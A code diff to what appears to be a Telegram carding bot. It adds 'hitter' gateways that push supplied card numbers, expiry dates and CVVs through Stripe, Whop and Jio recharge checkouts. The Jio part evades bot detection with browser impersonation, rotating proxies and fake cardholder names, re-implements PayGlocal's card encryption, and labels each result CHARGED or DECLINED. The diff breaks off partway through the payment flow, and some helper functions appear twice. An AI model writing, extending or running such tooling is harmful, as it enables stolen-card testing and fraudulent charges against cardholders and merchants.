@@ -55,6 +55,16 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings("ignore", category=Warning)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
+import logging
+
+# Disable all HTTP request logging from httpx, urllib3, etc.
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("urllib3").setLevel(logging.WARNING)
+logging.getLogger("httpcore").setLevel(logging.WARNING)
+logging.getLogger("telegram").setLevel(logging.WARNING)
+
+logging.getLogger("apscheduler").setLevel(logging.WARNING)
+
 
 
 # Create a dedicated thread pool for blocking operations
@@ -11202,6 +11212,10 @@ class GatewayManager:
             "stripe_auth0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
             "chk0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
             "mchk0": {"enabled": True, "name": "Stripe Auth 0$ Mass", "emoji": "🔓"},
+            
+            "stco": {"enabled": True, "name": "Stripe Checkout Hitter", "emoji": "💳", "tier": "ultimate"},
+            "jhit": {"enabled": True, "name": "Jio Recharge Hitter", "emoji": "📱", "tier": "ultimate"},
+            "whop": {"enabled": True, "name": "Whop Checkout Hitter", "emoji": "🛒", "tier": "ultimate"},
         }
         self.load_status()
     
@@ -14469,7 +14483,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
 # ============ UPDATED /stco COMMAND WITH SESSION DATA ============
 
 # ============ FIXED STCO COMMAND WITH HIT NOTIFICATION ============
-
+@check_gateway("stco")
 async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Stripe Checkout Hitter - /stco <url> <card>
@@ -14840,941 +14854,1122 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ============ JIO RECHARGE HITTER - PLAYWRIGHT (UPDATED) ============
 
-import asyncio
-import time
-import random
+
+
+# ============ JIO HITTER - COMPLETE WITH ALL FUNCTIONS ============
+# Add this to your f13.py
+
 import re
 import json
-from typing import Dict, Optional, Tuple, List
-from playwright.async_api import async_playwright, Page, Browser, BrowserContext
-from faker import Faker
-import traceback
+import time
+import random
+import asyncio
+import base64
+import logging
+import secrets as _sec
+import os
+from typing import Dict, Optional, List, Tuple
+from curl_cffi import requests as cf
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ContextTypes, CommandHandler
+from telegram.constants import ParseMode
 
-# Active tasks for Jio Hitter
-jio_hitter_active_tasks = {}
+# ============ LOGGING CONFIGURATION ============
+logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
+log = logging.getLogger("jhit")
 
-# ============ JIO HITTER CONFIGURATION ============
-JIO_URL = "https://www.jio.com/"
-JIO_TIMEOUT = 60000  # 60 seconds
-JIO_NAVIGATION_TIMEOUT = 30000
-
-# Card BIN patterns
-CARD_BRANDS = {
-    '4': 'VISA',
-    '5': 'MASTERCARD',
-    '3': 'AMEX',
-    '6': 'DISCOVER',
+# ============ PREMIUM EMOJI IDs ============
+PREMIUM_EMOJI_IDS = {
+    "diamond": "5427168083074628963",
+    "card": "5472250091332993630",
+    "target": "5377336227533969892",
+    "time": "5382194935057372936",
+    "info": "5042306247047513767",
+    "approved": "6266787022111773140",
+    "declined": "6267039884016358504",
+    "money": "5201873447554145566",
+    "rocket": "5196576190192096359",
+    "lock": "5197288647275071607",
+    "charged": "5039670412733055750",
+    "processing": "5206351870765300656",
+    "error": "5206121558164573238",
+    "phone": "5380498417228977451",
+    "globe": "5426850247242418700",
+    "fire": "5211438057774783669",
+    "warning": "5043954131415133302",
+    "skull": "5042167377869932162",
 }
 
-# ============ BROWSER MANAGER ============
+def premium_emoji(emoji_id: str, fallback: str = "•") -> str:
+    """Return premium emoji HTML tag."""
+    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
 
-class JioBrowserManager:
-    """Manage Playwright browser for Jio Recharge"""
-    
-    def __init__(self):
-        self.playwright = None
-        self.browser = None
-        self.context = None
-        self._lock = asyncio.Lock()
-        
-    async def get_browser(self, proxy: str = None, headless: bool = True) -> Browser:
-        async with self._lock:
-            if self.browser is None:
-                self.playwright = await async_playwright().start()
-                
-                launch_options = {
-                    'headless': headless,
-                    'args': [
-                        '--disable-blink-features=AutomationControlled',
-                        '--disable-dev-shm-usage',
-                        '--no-sandbox',
-                        '--disable-setuid-sandbox',
-                        '--disable-web-security',
-                        '--disable-features=IsolateOrigins,site-per-process',
-                        '--disable-site-isolation-trials',
-                        '--disable-features=BlockInsecurePrivateNetworkRequests',
-                        '--disable-gpu',
-                    ]
-                }
-                
-                if proxy:
-                    proxy_url = format_proxy(proxy)
-                    if proxy_url:
-                        launch_options['proxy'] = {'server': proxy_url}
-                        print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
-                
-                self.browser = await self.playwright.chromium.launch(**launch_options)
-                print(f"✅ Jio browser launched")
-            
-            return self.browser
-    
-    async def get_context(self, proxy: str = None) -> BrowserContext:
-        if self.context is None:
-            browser = await self.get_browser(proxy)
-            
-            viewport = {
-                'width': random.choice([1366, 1440, 1536, 1920]),
-                'height': random.choice([768, 900, 1080])
-            }
-            
-            user_agents = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            ]
-            
-            self.context = await browser.new_context(
-                viewport=viewport,
-                user_agent=random.choice(user_agents),
-                locale='en-IN',
-                timezone_id='Asia/Kolkata',
-                java_script_enabled=True,
-                bypass_csp=True,
-                extra_http_headers={
-                    'Accept-Language': 'en-IN,en;q=0.9',
-                }
-            )
-            
-            await self.context.add_init_script("""
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => undefined
-                });
-                Object.defineProperty(navigator, 'plugins', {
-                    get: () => [1, 2, 3, 4, 5]
-                });
-            """)
-            
-            print(f"✅ Jio browser context created")
-        
-        return self.context
-    
-    async def get_page(self, proxy: str = None) -> Page:
-        context = await self.get_context(proxy)
-        page = await context.new_page()
-        page.set_default_timeout(JIO_TIMEOUT)
-        return page
-    
-    async def close(self):
-        if self.context:
-            await self.context.close()
-            self.context = None
-        if self.browser:
-            await self.browser.close()
-            self.browser = None
-        if self.playwright:
-            await self.playwright.stop()
-            self.playwright = None
+def pe(emoji_id: str, fallback: str = "•") -> str:
+    """Shortcut for premium_emoji."""
+    return premium_emoji(emoji_id, fallback)
 
-# ============ JIO RECHARGE HITTER ============
+# ============ CRYPTO FUNCTIONS FOR PAYGLOCAL ============
 
-class JioRechargeHitter:
-    """Jio Recharge automation with Playwright"""
+try:
+    from joserfc import jwe as jwe_mod
+    from joserfc.jwk import RSAKey
+    JOSERFC_AVAILABLE = True
+except ImportError:
+    JOSERFC_AVAILABLE = False
+    print("⚠️ joserfc not installed. Install with: pip install joserfc")
+
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding as _pad
+
+
+def _decrypt_payglocal_key(encrypted_key: str, visitor_id: str) -> str:
+    """AES-128-CBC decrypt PayGlocal's RSA public key."""
+    import base64 as _b64
+
+    iv = _b64.b64decode(encrypted_key[:24])
+    ct = _b64.b64decode(encrypted_key[24:] + "==")
+    key = visitor_id[:16].encode("utf-8")
+
+    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+    padded = decryptor.update(ct) + decryptor.finalize()
+    unpadder = _pad.PKCS7(128).unpadder()
+    return (unpadder.update(padded) + unpadder.finalize()).decode("utf-8")
+
+
+def _encrypt_jwe(card_dict: dict, public_key_pem: str, kid: str) -> str:
+    """JWE encrypt card data: RSA-OAEP-256 + A128CBC-HS256."""
+    if not JOSERFC_AVAILABLE:
+        raise ImportError("joserfc is required. Install with: pip install joserfc")
     
-    def __init__(self, proxy: str = None, headless: bool = True):
-        self.proxy = proxy
-        self.headless = headless
-        self.browser_manager = JioBrowserManager()
-        self.fake = Faker('en_IN')
-        
-    async def perform_recharge(self, phone: str, amount: str, card: str) -> Dict:
-        """
-        Perform Jio recharge with the given details
-        """
-        print(f"\n{'='*80}")
-        print(f"📱 [JIO HITTER] Starting recharge")
-        print(f"📞 Phone: {phone}")
-        print(f"💰 Amount: ₹{amount}")
-        print(f"💳 Card: {card[:20]}...")
-        if self.proxy:
-            print(f"🔌 Using proxy: {mask_proxy(self.proxy)}")
-        print(f"{'='*80}")
-        
-        start_time = time.time()
-        
-        # Parse card
-        parts = card.split('|')
-        if len(parts) != 4:
-            return {
-                "status": "error",
-                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
-                "time": 0
-            }
-        
-        card_num, exp_month, exp_year, cvv = parts
-        card_num = card_num.replace(' ', '')
-        
-        if len(exp_year) == 2:
-            exp_year = f"20{exp_year}"
-        
-        result = {
-            "status": "pending",
-            "message": "Starting recharge process",
-            "phone": phone,
-            "amount": amount,
-            "card": card,
-            "time": 0,
-            "payment_status": None,
-            "order_id": None,
-            "transaction_id": None
-        }
-        
-        page = None
-        
+    key = RSAKey.import_key(public_key_pem)
+    token = jwe_mod.encrypt_compact(
+        {"alg": "RSA-OAEP-256", "enc": "A128CBC-HS256", "kid": kid},
+        json.dumps(card_dict).encode(),
+        key,
+        algorithms=["RSA-OAEP-256", "A128CBC-HS256"],
+    )
+    return token.decode() if isinstance(token, bytes) else token
+
+
+# ============ JIO HITTER HELPERS ============
+
+def _parse_proxy(raw: str | None) -> dict | None:
+    """'host:port:user:pass' → curl_cffi proxies dict, or None."""
+    if not raw:
+        return None
+    p = raw.strip().split(":")
+    if len(p) == 4:
+        url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
+    elif len(p) == 2:
+        url = f"http://{p[0]}:{p[1]}"
+    else:
+        return None
+    return {"http": url, "https": url}
+
+def _detect_card_type(cc: str):
+    f = cc[0]
+    if f == "4": return "visa", "VISA_CARD", "ic_visa"
+    if f == "5": return "mastercard", "MASTERCARD_CARD", "ic_mastercard"
+    if f == "3": return "amex", "AMEX_CARD", "ic_amex"
+    if f == "6": return "rupay", "RUPAY_CARD", "ic_rupay"
+    return "visa", "VISA_CARD", "ic_visa"
+
+def _find_plan_key(plans_data: dict, target_amount: str) -> str:
+    target = target_amount.strip().lstrip("₹").strip().split(".")[0]
+
+    def _walk(obj):
+        if isinstance(obj, list):
+            for item in obj:
+                r = _walk(item)
+                if r:
+                    return r
+        elif isinstance(obj, dict):
+            for pf in ("planPrice", "price", "offerPrice", "discountedPrice", "amount", "rs"):
+                raw = str(obj.get(pf, "")).lstrip("₹").strip().split(".")[0]
+                if raw == target:
+                    pk = obj.get("planKey") or obj.get("key") or obj.get("planId")
+                    if pk:
+                        return pk
+            for v in obj.values():
+                r = _walk(v)
+                if r:
+                    return r
+        return None
+
+    return _walk(plans_data) or ""
+
+def _decode_jwt_payload(token: str) -> dict:
+    try:
+        parts = token.split(".")
+        if len(parts) < 2:
+            return {}
+        pad = len(parts[1]) % 4
+        return json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (4 - pad if pad else 0)))
+    except Exception:
+        return {}
+
+
+def _decrypt_payglocal_key(encrypted_key: str, visitor_id: str) -> str:
+    """AES-128-CBC decrypt PayGlocal's RSA public key."""
+    import base64 as _b64
+
+    iv = _b64.b64decode(encrypted_key[:24])
+    ct = _b64.b64decode(encrypted_key[24:] + "==")
+    key = visitor_id[:16].encode("utf-8")
+
+    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+    padded = decryptor.update(ct) + decryptor.finalize()
+    unpadder = _pad.PKCS7(128).unpadder()
+    return (unpadder.update(padded) + unpadder.finalize()).decode("utf-8")
+
+
+def _encrypt_jwe(card_dict: dict, public_key_pem: str, kid: str) -> str:
+    """JWE encrypt card data: RSA-OAEP-256 + A128CBC-HS256."""
+    if not JOSERFC_AVAILABLE:
+        raise ImportError("joserfc is required. Install with: pip install joserfc")
+    
+    key = RSAKey.import_key(public_key_pem)
+    token = jwe_mod.encrypt_compact(
+        {"alg": "RSA-OAEP-256", "enc": "A128CBC-HS256", "kid": kid},
+        json.dumps(card_dict).encode(),
+        key,
+        algorithms=["RSA-OAEP-256", "A128CBC-HS256"],
+    )
+    return token.decode() if isinstance(token, bytes) else token
+
+
+# ============ PROXY FUNCTIONS ============
+
+def load_stripe_proxies() -> dict:
+    """Load proxies from file."""
+    PROXY_FILE = "stripe_hitter_proxies.json"
+    if os.path.exists(PROXY_FILE):
         try:
-            # Get page
-            page = await self.browser_manager.get_page(self.proxy)
-            
-            # ============ STEP 1: Navigate to Jio.com ============
-            print(f"📡 [JIO] Navigating to Jio.com...")
-            
-            await page.goto(JIO_URL, wait_until='domcontentloaded', timeout=JIO_NAVIGATION_TIMEOUT)
-            await page.wait_for_timeout(random.randint(3000, 5000))
-            
-            # Handle any popups or overlays
-            try:
-                # Close any modal/popup
-                close_selectors = [
-                    'button[aria-label="Close"]',
-                    'button:has-text("Close")',
-                    'button:has-text("×")',
-                    '.close-btn',
-                    '.modal-close',
-                ]
-                for selector in close_selectors:
-                    try:
-                        if await page.locator(selector).count() > 0 and await page.locator(selector).first.is_visible():
-                            await page.click(selector)
-                            await page.wait_for_timeout(1000)
-                            break
-                    except:
-                        continue
-            except:
-                pass
-            
-            # ============ STEP 2: Enter Phone Number ============
-            print(f"📡 [JIO] Entering phone number: {phone}")
-            
-            # Look for "Mobile" tab/button and click it
-            try:
-                mobile_tab_selectors = [
-                    'button:has-text("Mobile")',
-                    'div:has-text("Mobile")',
-                    'span:has-text("Mobile")',
-                    '[role="tab"]:has-text("Mobile")',
-                ]
-                for selector in mobile_tab_selectors:
-                    try:
-                        if await page.locator(selector).count() > 0:
-                            await page.click(selector)
-                            print(f"✅ [JIO] Clicked Mobile tab")
-                            await page.wait_for_timeout(1000)
-                            break
-                    except:
-                        continue
-            except:
-                pass
-            
-            # Find phone input - look for +91 prefix
-            phone_selectors = [
-                'input[type="tel"]',
-                'input[placeholder*="Phone"]',
-                'input[placeholder*="Mobile"]',
-                'input[name*="mobile"]',
-                'input[name*="phone"]',
-                'input[id*="mobile"]',
-                'input[id*="phone"]',
-                'input[aria-label*="Mobile"]',
-                'input[aria-label*="Phone"]',
-                '.phone-input',
-                '.mobile-input',
-                'input[inputmode="numeric"]',
-            ]
-            
-            phone_entered = False
-            for selector in phone_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.fill(selector, phone)
-                        phone_entered = True
-                        print(f"✅ [JIO] Phone entered using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not phone_entered:
-                # Try to find the input next to +91 text
-                try:
-                    # Find element with +91 text
-                    plus91 = await page.query_selector('text="+91"')
-                    if plus91:
-                        # Find input near it
-                        parent = await plus91.evaluate_handle("el => el.parentElement")
-                        inputs = await parent.query_selector_all('input')
-                        for inp in inputs:
-                            try:
-                                await inp.fill(phone)
-                                phone_entered = True
-                                print(f"✅ [JIO] Phone entered using +91 parent")
-                                break
-                            except:
-                                continue
-                except:
-                    pass
-            
-            if not phone_entered:
-                raise Exception("Could not find phone number input field")
-            
-            await page.wait_for_timeout(random.randint(1000, 2000))
-            
-            # ============ STEP 3: Click Proceed ============
-            print(f"📡 [JIO] Clicking Proceed button...")
-            
-            proceed_selectors = [
-                'button:has-text("Proceed")',
-                'button:has-text("Continue")',
-                'button:has-text("Next")',
-                'button:has-text("Get Recharge")',
-                'button[type="submit"]',
-                '.proceed-btn',
-                '.continue-btn',
-                'button:has-text("Proceed")',
-                'button:has-text("Continue")',
-            ]
-            
-            proceed_clicked = False
-            for selector in proceed_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        proceed_clicked = True
-                        print(f"✅ [JIO] Clicked Proceed using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not proceed_clicked:
-                # Try to find any button with text containing proceed/continue
-                try:
-                    buttons = await page.query_selector_all('button')
-                    for btn in buttons:
-                        try:
-                            text = await btn.text_content()
-                            if text and any(word in text.lower() for word in ['proceed', 'continue', 'next']):
-                                await btn.click()
-                                proceed_clicked = True
-                                print(f"✅ [JIO] Clicked button with text: {text}")
-                                break
-                        except:
-                            continue
-                except:
-                    pass
-            
-            if not proceed_clicked:
-                raise Exception("Could not find Proceed button")
-            
-            await page.wait_for_timeout(random.randint(3000, 5000))
-            
-            # ============ STEP 4: Select ₹200 Plan ============
-            print(f"📡 [JIO] Selecting ₹{amount} plan...")
-            
-            plan_found = False
-            # Wait for plans to load
-            await page.wait_for_timeout(2000)
-            
-            plan_selectors = [
-                f'button:has-text("₹{amount}")',
-                f'div:has-text("₹{amount}")',
-                f'span:has-text("₹{amount}")',
-                f'.plan-card:has-text("₹{amount}")',
-                f'.recharge-plan:has-text("₹{amount}")',
-                f'[data-amount="{amount}"]',
-                f'[data-price="{amount}"]',
-                f'button:has-text("{amount}")',
-            ]
-            
-            for selector in plan_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        plan_found = True
-                        print(f"✅ [JIO] Selected ₹{amount} plan using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not plan_found:
-                # Try to scroll and find plans
-                try:
-                    await page.evaluate("window.scrollTo(0, 300)")
-                    await page.wait_for_timeout(1000)
-                    
-                    # Look for plan elements
-                    plan_elements = await page.query_selector_all('.plan-card, .recharge-plan, [class*="plan"], [class*="recharge"]')
-                    for elem in plan_elements:
-                        try:
-                            text = await elem.text_content()
-                            if text and f"₹{amount}" in text:
-                                await elem.click()
-                                plan_found = True
-                                print(f"✅ [JIO] Selected plan by text: ₹{amount}")
-                                break
-                        except:
-                            continue
-                except:
-                    pass
-            
-            if not plan_found:
-                raise Exception(f"Could not find ₹{amount} plan")
-            
-            await page.wait_for_timeout(random.randint(2000, 3000))
-            
-            # ============ STEP 5: Click Recharge/Proceed to Payment ============
-            print(f"📡 [JIO] Clicking Recharge button...")
-            
-            recharge_selectors = [
-                'button:has-text("Recharge")',
-                'button:has-text("Pay Now")',
-                'button:has-text("Proceed to Pay")',
-                'button:has-text("Continue")',
-                'button:has-text("Buy Now")',
-                '.recharge-btn',
-                '.pay-now-btn',
-                'button:has-text("Recharge")',
-                'button[type="submit"]',
-            ]
-            
-            recharge_clicked = False
-            for selector in recharge_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        recharge_clicked = True
-                        print(f"✅ [JIO] Clicked Recharge using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not recharge_clicked:
-                raise Exception("Could not find Recharge button")
-            
-            await page.wait_for_timeout(random.randint(3000, 5000))
-            
-            # ============ STEP 6: Select Card Payment Option ============
-            print(f"📡 [JIO] Selecting card payment option...")
-            
-            # Wait for payment options to load
-            await page.wait_for_timeout(2000)
-            
-            card_option_selectors = [
-                'button:has-text("Card")',
-                'button:has-text("Credit Card")',
-                'button:has-text("Debit Card")',
-                'button:has-text("Credit/Debit Card")',
-                'div:has-text("Card")',
-                '.payment-option:has-text("Card")',
-                'img[alt*="Card"]',
-                '[data-payment-method="card"]',
-                'button:has-text("card")',
-            ]
-            
-            card_selected = False
-            for selector in card_option_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        card_selected = True
-                        print(f"✅ [JIO] Selected card option using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not card_selected:
-                # Try to find payment options
-                try:
-                    payment_elements = await page.query_selector_all('.payment-option, [class*="payment"], [class*="pay"]')
-                    for elem in payment_elements:
-                        try:
-                            text = await elem.text_content()
-                            if text and ('card' in text.lower() or 'debit' in text.lower() or 'credit' in text.lower()):
-                                await elem.click()
-                                card_selected = True
-                                print(f"✅ [JIO] Selected card option by text")
-                                break
-                        except:
-                            continue
-                except:
-                    pass
-            
-            if not card_selected:
-                raise Exception("Could not find card payment option")
-            
-            await page.wait_for_timeout(random.randint(2000, 3000))
-            
-            # ============ STEP 7: Fill Card Details ============
-            print(f"📡 [JIO] Filling card details...")
-            
-            # Wait for card form
-            await page.wait_for_timeout(2000)
-            
-            # Card Number
-            card_number_entered = False
-            card_selectors = [
-                'input[placeholder*="Card Number"]',
-                'input[placeholder*="card number"]',
-                'input[placeholder*="Card No"]',
-                'input[name*="cardNumber"]',
-                'input[name*="card_number"]',
-                'input[id*="cardNumber"]',
-                'input[aria-label*="Card Number"]',
-                'input[type="tel"][maxlength="19"]',
-                'input[type="text"][maxlength="19"]',
-            ]
-            
-            for selector in card_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.fill(selector, card_num)
-                        card_number_entered = True
-                        print(f"✅ [JIO] Card number entered using: {selector}")
-                        break
-                except:
-                    continue
-            
-            # Expiry
-            expiry_entered = False
-            expiry_value = f"{exp_month}{exp_year[2:]}"
-            expiry_selectors = [
-                'input[placeholder*="MM/YY"]',
-                'input[placeholder*="mm/yy"]',
-                'input[placeholder*="MM / YY"]',
-                'input[placeholder*="Expiry"]',
-                'input[name*="expiry"]',
-                'input[id*="expiry"]',
-                'input[aria-label*="Expiry"]',
-            ]
-            
-            for selector in expiry_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.fill(selector, expiry_value)
-                        expiry_entered = True
-                        print(f"✅ [JIO] Expiry entered using: {selector}")
-                        break
-                except:
-                    continue
-            
-            # CVV
-            cvv_entered = False
-            cvv_selectors = [
-                'input[placeholder*="CVV"]',
-                'input[placeholder*="cvv"]',
-                'input[placeholder*="CVC"]',
-                'input[name*="cvv"]',
-                'input[name*="cvc"]',
-                'input[id*="cvv"]',
-                'input[aria-label*="CVV"]',
-                'input[type="tel"][maxlength="4"]',
-                'input[type="text"][maxlength="4"]',
-            ]
-            
-            for selector in cvv_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.fill(selector, cvv)
-                        cvv_entered = True
-                        print(f"✅ [JIO] CVV entered using: {selector}")
-                        break
-                except:
-                    continue
-            
-            # Name on Card
-            name_entered = False
-            fake_name = self.fake.name()
-            name_selectors = [
-                'input[placeholder*="Name on Card"]',
-                'input[placeholder*="cardholder"]',
-                'input[name*="cardholder"]',
-                'input[name*="name"]',
-            ]
-            
-            for selector in name_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.fill(selector, fake_name)
-                        name_entered = True
-                        print(f"✅ [JIO] Name entered using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not card_number_entered or not expiry_entered or not cvv_entered:
-                print(f"⚠️ [JIO] Some card fields may not have been filled correctly")
-            
-            await page.wait_for_timeout(random.randint(1000, 2000))
-            
-            # ============ STEP 8: Click Pay Button ============
-            print(f"🔥 [JIO] Clicking Pay button...")
-            
-            pay_selectors = [
-                'button:has-text("Pay")',
-                'button:has-text("Pay Now")',
-                'button:has-text("Submit")',
-                'button:has-text("Confirm")',
-                'button[type="submit"]',
-                '.pay-btn',
-                '.submit-btn',
-                'button:has-text("Pay")',
-            ]
-            
-            pay_clicked = False
-            for selector in pay_selectors:
-                try:
-                    if await page.locator(selector).count() > 0:
-                        await page.click(selector)
-                        pay_clicked = True
-                        print(f"✅ [JIO] Clicked Pay using: {selector}")
-                        break
-                except:
-                    continue
-            
-            if not pay_clicked:
-                raise Exception("Could not find Pay button")
-            
-            # ============ STEP 9: Wait for Response ============
-            print(f"⏳ [JIO] Waiting for payment response...")
-            
-            success = False
-            transaction_id = None
-            
-            for _ in range(30):  # Wait up to 30 seconds
-                await page.wait_for_timeout(1000)
-                
-                try:
-                    page_content = await page.content()
-                    page_text = page_content.lower()
-                    
-                    # Check for success
-                    success_indicators = [
-                        'success', 'thank you', 'payment successful', 
-                        'order confirmed', 'receipt', 'transaction id',
-                        'payment completed', 'successful', 'recharge successful'
-                    ]
-                    
-                    for indicator in success_indicators:
-                        if indicator in page_text:
-                            success = True
-                            print(f"✅ [JIO] Payment successful!")
-                            break
-                    
-                    if success:
-                        # Try to extract transaction ID
-                        id_patterns = [
-                            r'order[_\s]*id[:\s]*([A-Z0-9-]+)',
-                            r'transaction[_\s]*id[:\s]*([A-Z0-9-]+)',
-                            r'receipt[_\s]*no[:\s]*([A-Z0-9-]+)',
-                        ]
-                        
-                        for pattern in id_patterns:
-                            match = re.search(pattern, page_text, re.IGNORECASE)
-                            if match:
-                                transaction_id = match.group(1)
-                                break
-                        break
-                    
-                    # Check for error
-                    error_indicators = [
-                        'declined', 'failed', 'error', 'invalid',
-                        'insufficient', 'try again', 'payment failed'
-                    ]
-                    
-                    error_found = False
-                    for indicator in error_indicators:
-                        if indicator in page_text:
-                            error_found = True
-                            break
-                    
-                    if error_found:
-                        error_msg = "Payment declined"
-                        # Try to get error message
-                        error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', page_content, re.DOTALL)
-                        if error_match:
-                            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
-                        elif 'declined' in page_text:
-                            error_msg = "Card was declined"
-                        elif 'insufficient' in page_text:
-                            error_msg = "Insufficient funds"
-                        
-                        print(f"❌ [JIO] Payment failed: {error_msg}")
-                        result["status"] = "declined"
-                        result["message"] = error_msg
-                        result["payment_status"] = "failed"
-                        break
-                        
-                except Exception as e:
-                    print(f"⚠️ [JIO] Error checking response: {e}")
-                    continue
-            
-            # Take screenshot for debugging
-            try:
-                screenshot_path = f"jio_recharge_{int(time.time())}.png"
-                await page.screenshot(path=screenshot_path)
-                print(f"📸 Screenshot saved: {screenshot_path}")
-            except:
-                pass
-            
-            elapsed_time = time.time() - start_time
-            
-            # Build result
-            if success:
-                result["status"] = "success"
-                result["message"] = "Recharge successful!"
-                result["payment_status"] = "success"
-                result["transaction_id"] = transaction_id or "N/A"
-                result["time"] = elapsed_time
-                result["status_display"] = "✅ CHARGED"
-                result["status_category"] = "charged"
-            elif result.get("status") == "declined":
-                result["time"] = elapsed_time
-                result["status_display"] = "❌ DECLINED"
-                result["status_category"] = "declined"
-            else:
-                result["status"] = "unknown"
-                result["message"] = "Unknown response from Jio"
-                result["time"] = elapsed_time
-                result["status_display"] = "⚠️ UNKNOWN"
-                result["status_category"] = "unknown"
-            
-            print(f"\n📊 [JIO] Recharge complete!")
-            print(f"   Status: {result['status']}")
-            print(f"   Time: {elapsed_time:.2f}s")
-            print(f"   Message: {result['message']}")
-            
+            with open(PROXY_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def get_stripe_user_proxy(user_id: int) -> Optional[str]:
+    """Get user's proxy for Stripe hitter."""
+    proxies = load_stripe_proxies()
+    user_proxies = proxies.get(str(user_id), [])
+    if user_proxies:
+        if isinstance(user_proxies, list):
+            return random.choice(user_proxies)
+        return user_proxies
+    return None
+
+def mask_proxy(proxy: str) -> str:
+    """Mask proxy for display."""
+    if not proxy:
+        return "None"
+    try:
+        if '@' in proxy:
+            parts = proxy.split('@')
+            return f"***@{parts[1]}"
+        return "***.***.***.***:***"
+    except:
+        return "Proxy (masked)"
+
+# ============ JIO MAIN FUNCTION ============
+
+def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
+            proxy: str | None = None) -> dict:
+    """Full Jio → EaseBuzz → PayGlocal checkout with proper status detection."""
+    t0 = time.time()
+    proxies = _parse_proxy(proxy)
+    
+    # ============ Initialize result with safe defaults ============
+    result = {
+        "steps": {},
+        "elapsed": 0,
+        "status": None,
+        "message": None,
+        "card": f"{cc}|{mm}|{yy}|{cvv}"
+    }
+
+    print("\n" + "=" * 60)
+    print("🚀 STARTING JIO RECHARGE")
+    print(f"📱 Phone: {phone}")
+    print(f"💰 Amount: ₹{amount}")
+    print(f"💳 Card: {cc[:4]}****{cc[-4:]}")
+    print(f"🔌 Proxy: {proxy if proxy else 'None'}")
+    print("=" * 60 + "\n")
+
+    jio_sess = cf.Session(impersonate="chrome124", proxies=proxies)
+    pay_sess = cf.Session(impersonate="chrome124", proxies=proxies)
+
+    recharge_ref = (
+        f"https://www.jio.com/selfcare/recharge/mobility/plans/"
+        f"?serviceType=mobility&serviceId={phone}&next=PREPAID"
+        f"&billingType=PREPAID&entrysource=Widget"
+    )
+    bh = {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+    }
+
+    # ── Step 1: Number lookup ─────────────────────────────────────────────────
+    print("📡 Step 1: Looking up number...")
+    try:
+        r = jio_sess.get(
+            f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{phone}",
+            headers={**bh, "Referer": "https://www.jio.com/"},
+            timeout=20,
+        )
+        if r.status_code not in (200, 201):
+            result["error"] = f"Step 1 HTTP {r.status_code}: {r.text[:200]}"
+            result["status"] = "ERROR"
+            print(f"❌ Step 1 failed: {result['error']}")
             return result
-            
+        print(f"✅ Step 1: Number lookup successful")
+    except Exception as e:
+        result["error"] = f"Step 1: {e}"
+        result["status"] = "ERROR"
+        print(f"❌ Step 1 error: {e}")
+        return result
+
+    # ── Step 2: Plans ─────────────────────────────────────────────────────────
+    print("📡 Step 2: Fetching plans...")
